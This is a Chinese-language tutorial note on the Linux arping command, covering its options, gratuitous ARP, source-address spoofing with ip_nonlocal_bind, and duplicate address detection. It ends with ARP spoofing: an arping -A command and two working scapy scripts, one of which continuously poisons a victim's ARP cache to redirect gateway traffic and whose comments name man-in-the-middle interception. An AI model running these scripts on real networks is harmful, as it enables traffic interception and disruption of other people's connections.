```table-of-contents
```
# 介绍
arping命令是用于发送arp请求到一个相邻主机的工具；使用ARP报文数据包来测试网络状态，能够判断某个指定IP地址是否在网络上已被使用，并能够获取更多设备信息，像是加强版的ping命令。  

# 参数

![](attachments/Pasted%20image%2020241010114143.png)

![](attachments/Pasted%20image%2020240626202915.png)

```bash
-A     The same as -U, but ARP REPLY packets used instead of ARP REQUEST.
		更新邻近主机的ARP缓存（使用ARP应答数据包代替ARP请求数据包）
		
-U     Unsolicited ARP mode to update neighbours' ARP caches.  No replies are expected. 


-I： 指定发送出口

-s: 指定sip

-b : 通常，_arping_首先将 ARP 请求作为 MAC 广播发送。但是，当它收到对广播 ARP 请求的回复时，它会切换到单播。它开始仅向目标主机发送以下 ARP 请求。
使用 -b选项，可以更改此行为并仅发送广播。


```

# 使用
## 请求mac地址
请求解析192.168.100.70主机的MAC地址
```bash
arping -f 192.168.100.70
```
这将会发送广播报文，直到收到192.168.100.70的回复才退出。

同时，192.168.100.70也会缓存本机的IP和MAC对应条目，由于此处没有指定请求报文的发送接口和源地址，所以发送报文时是根据路由表来选择接口和对应该接口地址的。

## 主动提供的 ARP

-U 选项在未经请求的 ARP 模式下运行arping;
主动提供的 ARP 也称为无偿 ARP（未经请求的 ARP）。
**未经请求的 ARP 在相邻主机请求之前 通过发送免费arp请求（ip为本机的ip）来更新相邻主机的 ARP 表**。

### 使用场景
这可能很有用，例如，当本地主机的 MAC 或 IP 地址因故障转移而发生更新时。未经请求的 ARP 将此更改传播到其他主机。
在这种情况下，不需要 ARP 回复。让我们使用带有-U选项的arping来更新目标主机的 ARP 表：
```bash
arping –U -c 1 192.39.59.17
ARPING 192.39.59.17 from 192.39.59.17 eth0
Sent 1 probes (1 broadcast(s))
Received 0 response(s)
```

作为上述命令执行的结果，如果目标主机的 ARP 表中没有本地主机的条目，则添加该条目。如果 ARP 表中已经有一个条目，它会被更新。

输出的最后一行`Received 0 response(s)` 表明我们没有得到预期的 ARP 回复。
除此之外，arping 将源 IP 地址设置为目标 IP 地址，正如我们在输出的第一行中看到的，`ARPING 192.39.59.17 from 192.39.59.17 eth0`。


**注意**

![](attachments/Pasted%20image%2020241010115835.png)

默认情况下，不允许使用未经请求的 ARP 更新在 ARP 表中创建新条目。因此，我们必须使将目标主机中的arp_accept内核参数设置为1。默认情况下它等于0。
```bash
$ sysctl net.ipv4.conf.all.arp_accept # Unsolicited ARP isn’t allowed
net.ipv4.conf.all.arp_accept = 0 

$ sysctl -w net.ipv4.conf.all.arp_accept=1 # Now, unsolicited ARP is allowed
net.ipv4.conf.all.arp_accept = 1
```

## 只发送ARP响应

使用使用 -A 选项的 arping 还会更新目标主机的 ARP 表。但是，它不使用未经请求的 ARP（即免费的arp请求），而是使用 ARP 回复。

```bash
arping –A -c 1 192.39.59.17
ARPING 192.39.59.17 from 192.39.59.17 eth0
Sent 1 probes (1 broadcast(s))
Received 0 response(s)
```

由于arping发送一个 ARP 回复，在这种情况下，我们没有得到任何响应。我们在输出的最后一行`Received 0 response(s)`中观察到了这种行为。arping 将源 IP 地址设置为目标 IP 地址，就像使用 -U 选项一样。

## 指定arp的源地址

arping 自动分配 ARP 数据包中的源 IP 地址。但是，也可以使用`-s`选项手动设置它。

首先，让我们尝试在不使用`-s`选项的情况下 ping 目标 192.39.59.17：

```bash
$ arping –c 1 192.39.59.17
ARPING 192.39.59.17 from 192.39.59.16 eth0
Unicast reply from 192.39.59.17 [00:50:56:B2:AB:CD]  0.697ms
Sent 1 probes (1 broadcast(s))
Received 1 response(s)
```

正如我们在输出的第一行中看到的，来自`192.39.59.16`的术语表示arping使用`192.39.59.16`作为源 IP 地址。这是本地主机的 IP 地址。

现在，让我们尝试使用`–s`选项ping 目标`192.39.59.17`：
```bash
$ arping –c 1 –s 192.39.59.20 192.39.59.17
ARPING 192.39.59.17 from 192.39.59.20 eth0
Unicast reply from 192.39.59.17 [00:50:56:B2:AB:CD]  0.697ms
Sent 1 probes (1 broadcast(s))
Received 1 response(s)
```

在这里，我们使用`–s 192.39.59.20` 将源 IP 地址设置为`192.39.59.20`。输出第一行中来自`192.39.59.20`的术语表明arping实际上使用了指定的源地址。

### ip_nonlocal_bind 参数
为了能够使用`-s`选项设置源 IP 地址，我们必须能够绑定非本地机器的地址。通常，这是禁用的。但是，我们可以通过将`net.ipv4.ip_nonlocal_bind`内核参数设置为1来启用它。

ip_nonlocal_bind： 是否运行服务绑定一个本机不存在的IP地址。



#### 配置说明

![](attachments/Pasted%20image%2020240425111206.png)

0：默认值，表示不允许服务绑定一个本机不存在的地址。
1：表示运行服务绑定一个本机不存在的地址。


#### 使用场景
有些服务需要依赖一个VIP才可以启动，但是可能正常情况下，此VIP并不在本机上，当VIP漂移到本机上时才存在；但是服务又需要提前启动。例如，haproxy、nginx 等代理需要绑定VIP时。

#### 范例

```bash
$ sysctl net.ipv4.ip_nonlocal_bind
net.ipv4.ip_nonlocal_bind = 0

$ arping –c 1 –s 192.39.59.20 192.39.59.17
bind: Cannot assign requested address

$ sysctl –w net.ipv4.ip_nonlocal_bind=1
net.ipv4.ip_nonlocal_bind = 1

$ arping –f –s 192.39.59.20 192.39.59.17
ARPING 192.39.59.17 from 192.39.59.20 eth0
Unicast reply from 192.39.59.17 [00:50:56:B2:AB:CD]  0.697ms
Sent 1 probes (1 broadcast(s))
Received 1 response(s)
```


## 在重复地址检测模式下运行

我们将-D选项传递给arping以在重复地址检测 (DAD) 模式下运行它。如果网络中的另一台主机正在使用目标 IP 地址，则arping会检测到这一点并返回1。如果没有重复的 IP 地址，则返回0。**

让我们在 DAD 模式下测试已经使用的 IP 地址192.39.59.17：
```bash
$ arping –D –c 1 192.39.59.17
ARPING 192.39.59.17 from 0.0.0.0 eth0
Unicast reply from 192.39.59.17 [00:50:56:B2:AB:CD] 0.970ms
Sent 1 probes (1 broadcast(s))
Received 1 response(s)

$ echo $?
1
```
由于IP地址 192.39.59.17 是远程主机的IP地址，所以 arping 返回 1作为退出状态。

现在，让我们使用-D选项ping 一个未使用的 IP 地址：
```bash
$ arping -D –c 1 192.39.59.20
ARPING 192.39.59.20 from 0.0.0.0 eth0
Sent 1 probes (1 broadcast(s))
Received 0 response(s)
$ echo $?
0
```

现在，由于没有 IP 地址为192.39.50.20的主机，arping的退出状态为0。

**在 DAD 模式下使用arping会自动将源 IP 地址设置为0.0.0.0。**


## ARP欺骗
```bash
arping -A -I eth1 -s 192.168.100.54 192.168.100.70

```

发送这样的arp请求包，将会使得目标主机192.168.100.70缓存本机的arp条目为”192.168.100.54 MAC_eth1”，但实际上，192.168.100.54所在接口的MAC地址为MAC_eth0。

arping命令仅能实现这种简单的arp欺骗，更多的arp欺骗方法可以使用专门的工具。




# 其他

## scapy构造arp包

由于arping的时候，无法指定mac地址，如果 `-I` 指定的网口被 DPDK程序接管了，那么在linux内核中就无法管理该口；那么就无法指定了，比如 VF 口被DPDK接管。那么此时通过 scapy 进行构造 ARP 响应的欺骗包进行处理。

### arp请求
**先看下ARP包的格式：**
```python
>>> ARP()
<ARP  |>
>>> _.show()
###[ ARP ]###
  hwtype= 0x1
  ptype= 0x800	#协议号
  hwlen= 6
  plen= 4
  op= who-has	#op=1表示Request，op=2表示Response
  hwsrc= 00:0c:29:5d:2f:55	#源MAC地址
  psrc= 192.168.8.128	#源IP地址
  hwdst= 00:00:00:00:00:00	#初始目的为广播地址
  pdst= 0.0.0.0		#缺省为空

```


发送构造的ARP请求包：
```python
#!/usr/bin/env python3
#-*- coding:UTF-8 -*-

import logging

logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
from kamene.all import *
from Tools.Get_address import get_ip_address  # 获取本机IP地址
from Tools.Get_address import get_mac_address  # 获取本机MAC地址
from Tools.Scapy_iface import scapy_iface  # 获取scapy iface的名字


def arp_request(dst_addr, ifname):
    # 获取本机IP地址
    local_ip = get_ip_address(ifname)
    # 获取本机MAC地址
    local_mac = get_mac_address(ifname)
    try: 
        # 发送ARP请求并等待响应
        #op=1表示请求，op=2表示响应
        #当op=1,hwsrc=表示本地mac，hwdst表示广播(首包)，psrc表示本地IP，pdst表示目的IP
        result_raw = sr1(ARP(op=1,
                             hwsrc=local_mac,
                             hwdst='00:00:00:00:00:00',
                             psrc=local_ip,
                             pdst=dst_addr),
                         iface=scapy_iface(ifname),
                         timeout=1,
                         verbose=False)
        # sr1：在第三层发送数据包,有接收功能，但只接收第一个数据包。
        # 用于哪些判断和目标是否通，接收一个数据包就能判断，没必要接收多个。
        print(result_raw.show())
        #返回目的IP地址，和目的MAC地址，getlayer(ARP)取整个ARP数据包，
        return dst_addr, result_raw.getlayer(ARP).fields.get('hwsrc')

    except AttributeError:
        return dst_addr, None


if __name__ == "__main__":
    # Windows Linux均可使用
    # arp_result = arp_request('192.168.100.1', "WLAN")
    arp_result = arp_request('192.168.8.254', "ens32")
    print("IP地址:", arp_result[0], "MAC地址:", arp_result[1])

```

### arp欺骗

简单实现： 发送arp请求。
```python

from scapy.all import *
import time

#构造包
#pdst是目标IP，psrc是网关的ip
p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="b8:81:98:e0:46:6a")/ARP(pdst="192.168.43.250",psrc="192.168.43.1")
for i in range(6000):
    sendp(p1, iface="wan")
    time.sleep(0.1)
```


复杂实现：
```python
#!/usr/bin/env python3
#-*- coding:UTF-8 -*-


import logging
logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错

from kamene.all import *
from Tools.Get_address import get_ip_address  # 导入获取本机IP地址方法
from Tools.Get_address import get_mac_address  # 导入获取本机MAC地址方法
from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
from Tools.Scapy_iface import scapy_iface  # 获取scapy iface的名字
import time
import signal


def arp_spoof(ip_1,ip_2,ifname='ens35'):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    #赋值到全局变量
    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    #local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac= get_ip_address(ifname), get_mac_address(ifname)

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    dst_1_mac, dst_2_mac = arp_request(ip_1,ifname)[1], arp_request(ip_2,ifname)[1]

    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
              iface=scapy_iface(local_ifname),
              verbose=False)

        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1,ip_2,ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
          iface=scapy_iface(local_ifname),
          verbose=False)
    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()

if __name__ == "__main__":
    # 欺骗192.168.1.101,让它认为192.168.1.102的MAC地址为本机攻击者的MAC
    #如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
    arp_spoof('192.168.1.101' , '192.168.1.102' , 'ens35')

```





# 参考
```bash
# Arping 命令
https://www.itcodingman.com/arping_command/

scapy构造ARP
https://juejin.cn/post/6844903955026165768

```